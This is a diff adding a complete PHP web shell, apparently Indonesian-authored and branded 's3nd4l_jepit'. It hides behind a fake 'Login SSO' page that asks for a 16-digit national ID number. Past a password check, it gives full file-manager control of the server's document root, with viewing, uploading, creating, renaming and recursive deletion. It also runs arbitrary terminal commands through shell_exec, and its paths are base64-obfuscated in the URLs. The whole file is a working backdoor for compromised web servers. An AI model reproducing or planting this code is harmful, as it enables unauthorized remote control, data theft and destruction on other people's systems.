@@ -1,0 +1,580 @@
+<?php
+session_start();
+
+// PASSWORD: tai
+
+
+// Tampilkan error untuk debugging
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Periksa apakah pengguna sudah login
+if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
+    // Jika sudah login, tampilkan konten utama
+    showMainContent();
+} else {
+    // Jika belum login, tampilkan halaman login
+    showLoginPage();
+}
+
+function showLoginPage() {
+    // Jika pengguna mengirimkan formulir login
+    if (isset($_POST['password'])) {
+        // Verifikasi password menggunakan bcrypt hashing
+        $password = $_POST['password'];
+        $storedHash = '$2y$10$yX6uOf42zK4dxKCnvwddTusKyak7JXzlg8Xs4LaDWzBCD2ZvnvLue'; // Contoh hashed password
+        
+        if (password_verify($password, $storedHash)) {
+            // Simpan status login di session
+            $_SESSION['logged_in'] = true;
+            
+            // Redirect ke halaman utama
+            header("Location: ?");
+            exit; // Hentikan eksekusi skrip di sini untuk mencegah eksekusi lebih lanjut
+        } else {
+            // Jika password salah, tampilkan pesan error
+            $error = "Password salah!";
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login SSO | Single Sgin On</title>
+    <style>
+    body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-color: #202020;
+    }
+    
+    form {
+    background-color: #202020;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    width: 500px;
+    }
+    
+    input[type="password"] {
+    width: calc(100% - 20px);
+    padding: 10px;
+    margin-bottom: 15px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    background-color: #8b0000;
+    font-size: 16px;
+    }
+    
+    input[type="submit"] {
+    width: 100%;
+    padding: 10px;
+    border: none;
+    border-radius: 4px;
+    background-color: #8b0000;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    }
+    
+    input[type="submit"]:hover {
+    background-color: #8b0000;
+    }
+    img {
+    display: block;
+    margin: 0 auto 20px; 
+    width: 150px;
+    height: 150px;
+    border-radius: 50%;
+    border: 2px solid #8b0000;
+    object-fit: cover;
+    }
+    </style>
+    </head>
+    <body>
+    <?php echo (isset($error) ? '<p style="color: #8b0000;">'.$error.'</p>' : ''); ?>
+    <form method="post" action="">
+    <img src="https://media.tenor.com/TcwzV1IM0EcAAAAi/zero-two-ok.gif">
+    <input type="password" id="password" name="password" placeholder="Masukan Nik KTP 16 Digit" required><br>
+    <input type="submit" value="Login">
+    <center><p style="color: white;">Butuh Bantuan? <a href="https://google.com">Hubungi Admin</p></center>
+    </form>
+    </body>
+    </html>
+    <?php
+    }
+    
+    function showMainContent() {
+    ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Nothing is impossible</title>
+    <link href="https://fonts.googleapis.com/css?family=Protest Revolution" rel="stylesheet">
+    <!-- Tambahkan Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Reset beberapa gaya default browser */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        /* Gaya umum untuk body */
+        body {
+            font-family: 'Varela Round', sans-serif;
+            background-color: #202020;
+            color: #FFFFFF;
+            cursor: url('https://gitlab.com/s3nd4l_jepit/s3nd4l_jepit-minishell/-/raw/master/files/s3nd4l_jepit.png'), default;
+            line-height: 1.6;
+        }
+        
+        /* Gaya untuk elemen tabel */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            border: 1px solid #FFFFFF;
+            margin-top: 20px;
+        }
+        
+        th, td {
+            padding: 12px;
+            text-align: left;
+        }
+        
+        th {
+            background-color: #8b0000;
+            color: #FFFFFF;
+        }
+        
+        tr:nth-child(even) {
+            background-color: #202020;
+        }
+        
+        #content tr:hover {
+            background-color: #8b0000;
+        }
+        
+        #content .first {
+            background-color: #8b0000;
+            color: #FFFFFF;
+        }
+        
+        .item-name a {
+            color: #FFFFFF;
+            text-decoration: none;
+        }
+        
+        .item-name a:hover {
+            color: #16870e;
+        }
+        
+        /* Gaya untuk form input dan textarea */
+        input, select, textarea {
+            border: 1px solid #FFFFFF;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 15px;
+            background-color: #8b0000;
+            color: #FFFFFF;
+            font-size: 16px;
+        }
+        
+        input[type="submit"], input[type="file"] {
+            background-color: #8b0000;
+            border: none;
+            color: #FFFFFF;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        input[type="submit"]:hover {
+            background-color: #D30000;
+        }
+        
+        /* Gaya untuk textarea dalam form */
+        textarea {
+            width: calc(100% - 22px);
+            resize: vertical;
+        }
+
+        /* Gaya spesifik untuk textarea dalam form tertentu */
+        #createFileForm textarea,
+        #uploadFileForm textarea {
+            width: calc(100% - 22px);
+            height: 200px;
+        }
+
+        #createFolderForm textarea,
+        #terminalForm textarea {
+            width: calc(100% - 22px);
+            height: 100px;
+        }
+        
+        /* Gaya untuk link */
+        a {
+            color: #FFFFFF;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            color: #16870e;
+        }
+        
+        /* Gaya untuk elemen yang memiliki class s3nd4l */
+        .s3nd4l {
+            background-color: #8b0000;
+            padding: 4px 8px;
+            border-radius: 4px;
+            color: #FFFFFF;
+        }
+        
+        .s3nd4l:hover {
+            background-color: #850030;
+            color: #FFFFFF;
+        }
+        
+        /* Gaya untuk elemen yang memiliki class me */
+        .me {
+            color: #8b0000;
+            font-size: 29px;
+            font-family: 'Sedgwick Ave', sans-serif;
+            text-shadow: 0px 1px 0px #FFFFFF;
+        }
+        
+        /* Gaya untuk elemen yang memiliki class S3nd4l */
+        .S3nd4l {
+            background: transparent;
+        }
+        
+        .S3nd4l:hover {
+            background-color: transparent;
+            color: #8b0000;
+        }
+        
+        /* Gaya untuk header dan konten */
+        #content {
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #8b0000;
+        }
+
+        /* Gaya untuk menu kontrol */
+        .control-menu {
+            display: flex;
+            justify-content: center; /* Pusatkan tombol di tengah */
+            margin: 20px 0;
+        }
+
+        .control-menu button {
+            background-color: #8b0000;
+            border: none;
+            color: #FFFFFF;
+            padding: 10px 20px;
+            margin: 0 5px; /* Atur jarak antar tombol */
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .control-menu button:hover {
+            background-color: #8b0000;
+        }
+
+        /* Gaya untuk form tersembunyi */
+        .form-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .form-container.active {
+            display: block;
+        }
+
+        /* Gaya untuk textarea dalam form */
+        textarea.result-box {
+            width: 100%;
+            height: 200px;
+        }
+        
+        /* Ikon tombol dalam tabel */
+        .action-btn {
+            border: none;
+            background: none;
+            color: #8b0000;
+            cursor: pointer;
+            font-size: 20px; /* Menyesuaikan ukuran ikon */
+        }
+
+        .action-btn:hover {
+            color: #D30000;
+        }
+
+        .view-icon::before {
+            content: '\f06e'; /* Font Awesome Eye icon */
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+        }
+
+        .delete-icon::before {
+            content: '\f1f8'; /* Font Awesome Trash icon */
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+        }
+
+        .rename-icon::before {
+            content: '\f044'; /* Font Awesome Edit icon */
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            margin-left: 10px; /* Menambah jarak antar ikon */
+        }
+    </style>
+    <script>
+        function showForm(formId) {
+            // Sembunyikan semua formulir
+            var forms = document.querySelectorAll('.form-container');
+            forms.forEach(function(form) {
+                form.classList.remove('active');
+            });
+
+            // Tampilkan formulir yang dipilih
+            var form = document.getElementById(formId);
+            if (form) {
+                form.classList.add('active');
+            }
+        }
+    </script>
+</head>
+<body>
+<?php
+$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
+
+function x($b) {
+    return base64_encode($b);
+}
+
+function y($b) {
+    return base64_decode($b);
+}
+
+foreach ($_GET as $c => $d) $_GET[$c] = y($d);
+
+$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
+chdir($currentDirectory);
+
+$viewCommandResult = '';
+$terminalCommandResult = '';
+$uploadError = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
+        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
+        if (!file_exists($newFolder)) {
+            if (mkdir($newFolder, 0755, true)) {
+                echo '<hr>Folder berhasil dibuat!';
+            } else {
+                echo '<hr>Error: Gagal membuat folder!';
+            }
+        } else {
+            echo '<hr>Error: Folder sudah ada!';
+        }
+    } elseif (isset($_POST['delete_file'])) {
+        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
+        if (file_exists($fileToDelete)) {
+            if (is_dir($fileToDelete)) {
+                if (deleteDirectory($fileToDelete)) {
+                    echo '<hr>Folder berhasil dihapus!';
+                } else {
+                    echo '<hr>Error: Gagal menghapus folder!';
+                }
+            } else {
+                if (unlink($fileToDelete)) {
+                    echo '<hr>File berhasil dihapus!';
+                } else {
+                    echo '<hr>Error: Gagal menghapus file!';
+                }
+            }
+        } else {
+            echo '<hr>Error: File atau direktori tidak ditemukan!';
+        }
+    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+        $oldName = $currentDirectory . '/' . $_POST['old_name'];
+        $newName = $currentDirectory . '/' . $_POST['new_name'];
+        if (file_exists($oldName)) {
+            if (rename($oldName, $newName)) {
+                echo '<hr>Item berhasil diubah namanya!';
+            } else {
+                echo '<hr>Error: Gagal mengubah nama item!';
+            }
+        } else {
+            echo '<hr>Error: Item tidak ditemukan!';
+        }
+    } elseif (isset($_POST['view_file'])) {
+        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+        if (file_exists($fileToView)) {
+            $fileContent = file_get_contents($fileToView);
+            $viewCommandResult = '<hr><p>Hasil: ' . htmlspecialchars($_POST['view_file']) . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
+        } else {
+            $viewCommandResult = '<hr><p>Error: File tidak ditemukan!</p>';
+        }
+    } elseif (isset($_POST['new_file_name']) && isset($_POST['file_content'])) {
+        $newFileName = $currentDirectory . '/' . $_POST['new_file_name'];
+        $fileContent = $_POST['file_content'];
+        if (!file_exists($newFileName)) {
+            if (!empty($fileContent)) {
+                // Validasi nama file untuk menghindari risiko keamanan
+                if (preg_match('/^[a-zA-Z0-9-_\.]+$/i', $_POST['new_file_name'])) {
+                    if (file_put_contents($newFileName, $fileContent, LOCK_EX) !== false) {
+                        echo '<hr>File berhasil dibuat!';
+                    } else {
+                        echo '<hr>Error: Gagal membuat file!';
+                    }
+                } else {
+                    echo '<hr>Error: Nama file tidak valid!';
+                }
+            } else {
+                echo '<hr>Error: Konten file kosong!';
+            }
+        } else {
+            echo '<hr>Error: File sudah ada!';
+        }
+    } elseif (isset($_POST['terminal_command'])) {
+        // Pastikan perintah terminal aman untuk eksekusi
+        $command = escapeshellcmd($_POST['terminal_command']);
+        $terminalCommandResult = '<hr><p>Perintah: ' . htmlspecialchars($_POST['terminal_command']) . '</p><pre>' . htmlspecialchars(shell_exec($command)) . '</pre>';
+    } elseif (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
+        $uploadedFile = $_FILES['upload_file'];
+        $targetFilePath = $currentDirectory . '/' . basename($uploadedFile['name']);
+        // Validasi ukuran file
+        if ($uploadedFile['size'] > 0) {
+            if (move_uploaded_file($uploadedFile['tmp_name'], $targetFilePath)) {
+                echo '<hr>File berhasil diunggah!';
+            } else {
+                $uploadError = '<hr>Error: Gagal mengunggah file!';
+            }
+        } else {
+            $uploadError = '<hr>Error: File kosong!';
+        }
+    } elseif (isset($_FILES['upload_file'])) {
+        $uploadError = '<hr>Error: Upload gagal dengan kode ' . $_FILES['upload_file']['error'] . '!';
+    }
+}
+?>
+
+<center>
+    <div class="fig-ansi">
+        <pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: #FFFFFF;"><strong>
+ _____                          _             _                                       
+(  _  ) Nothing is impossible  ( )           ( )                             _        
+| (_) | _   _   _    _ _   ___ | |__     __  | |/')    __   _ __   ___ ___  (_)  ___  
+|  _  |( ) ( ) ( ) /'_` )/',__)|  _ `\ /'__`\| , <   /'__`\( '__)/' _ ` _ `\| |/' _ `\
+| | | || \_/ \_/ |( (_| |\__, \| | | |(  ___/| |\`\ (  ___/| |   | ( ) ( ) || || ( ) |
+(_) (_)`\___x___/'`\__,_)(____/(_) (_)`\____)(_) (_)`\____)(_)   (_) (_) (_)(_)(_) (_)
+</strong> </span></pre>
+    </div>
+</center>
+<hr>curdir:
+<?php
+$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
+$currentPath = '';
+foreach ($directories as $index => $dir) {
+    if ($index == 0) {
+        echo '<a href="?d=' . x($dir) . '">' . htmlspecialchars($dir) . '</a>';
+    } else {
+        $currentPath .= DIRECTORY_SEPARATOR . $dir;
+        echo ' / <a href="?d=' . x($currentPath) . '">' . htmlspecialchars($dir) . '</a>';
+    }
+}
+?>
+<br>
+<hr>
+<div class="control-menu">
+    <button onclick="showForm('createFolderForm')">Buat Folder</button>
+    <button onclick="showForm('createFileForm')">Buat File</button>
+    <button onclick="showForm('uploadFileForm')">Unggah File</button>
+    <button onclick="showForm('terminalForm')">Terminal</button>
+</div>
+<div id="createFolderForm" class="form-container">
+    <center><form method="post" action="?<?= htmlspecialchars(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') ?>">
+        <input type="text" name="folder_name" placeholder="Nama Folder Baru" required>
+        <input type="submit" value="Buat Folder"></center>
+    </form>
+</div>
+<div id="createFileForm" class="form-container">
+    <center><form method="post" action="?<?= htmlspecialchars(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') ?>" enctype="multipart/form-data">
+        <input type="text" name="new_file_name" placeholder="Nama File" required>
+        <p><textarea cols="30" rows="20" name="file_content" placeholder="Konten File" required></textarea></p>
+        <input type="submit" value="Buat File"></center>
+    </form>
+</div>
+<div id="uploadFileForm" class="form-container">
+    <center><form method="post" action="?<?= htmlspecialchars(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') ?>" enctype="multipart/form-data">
+        <input type="file" name="upload_file" required />
+        <input type="submit" value="Unggah File"></center>
+    </form>
+</div>
+<div id="terminalForm" class="form-container">
+    <center><form method="post" action="?<?= htmlspecialchars(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') ?>">
+        <input type="text" name="terminal_command" placeholder="Masukkan Perintah Terminal" required>
+        <input type="submit" value="Terminal"></center>
+    </form>
+</div>
+<?= $viewCommandResult ?>
+<?= $terminalCommandResult ?>
+<?= $uploadError ?>
+<div>
+</div>
+<table border="1">
+    <br>
+    <tr>
+        <th>Nama Item</th>
+        <th>Ukuran</th>
+        <th>Lihat</th>
+        <th>Hapus</th>
+        <th>Ganti Nama</th>
+    </tr>
+    <?php
+    foreach (scandir($currentDirectory) as $v) {
+        $u = realpath($v);
+        $s = stat($u);
+        $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?' . ('d=' . x($currentDirectory) . '&f=' . x($v));
+        echo '<tr>
+            <td class="item-name"><a href="' . $itemLink . '">' . htmlspecialchars($v) . '</a></td>
+            <td>' . $s['size'] . '</td>
+            <td><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '') . '"><input type="hidden" name="view_file" value="' . htmlspecialchars($v) . '"><button type="submit" class="action-btn view-icon"></button></form></td>
+            <td><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '') . '"><input type="hidden" name="delete_file" value="' . htmlspecialchars($v) . '"><button type="submit" class="action-btn delete-icon"></button></form></td>
+            <td><p><form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? htmlspecialchars($_SERVER['QUERY_STRING']) : '') . '"><input type="hidden" name="old_name" value="' . htmlspecialchars($v) . '"><input type="text" name="new_name" placeholder="Nama Baru" required><button type="submit" name="rename_item" class="action-btn rename-icon"></button></form></td>
+        </tr>';
+    }
+    ?>
+</table>
+<?php
+function deleteDirectory($dir) {
+    if (!file_exists($dir)) {
+        return true;
+    }
+    if (!is_dir($dir)) {
+        return unlink($dir);
+    }
+    foreach (scandir($dir) as $item) {
+        if ($item == '.' || $item == '..') {
+            continue;
+        }
+        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
+            return false;
+        }
+    }
+    return rmdir($dir);
+}
+?>
+</body>
+</html>
+<?php
+}
+?>
